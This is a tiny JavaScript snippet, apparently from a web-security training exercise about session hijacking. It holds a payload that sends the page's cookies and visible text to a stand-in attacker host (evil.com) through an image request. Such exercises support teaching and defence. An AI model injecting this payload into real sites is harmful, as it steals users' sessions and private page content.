// 🐨 Copy the Javascript from hijack.html here
const img = new Image();
img.src = `https://evil.com:666/hijack?payload=${encodeURIComponent(
  document.cookie + " " + document.body.innerText
)}`;
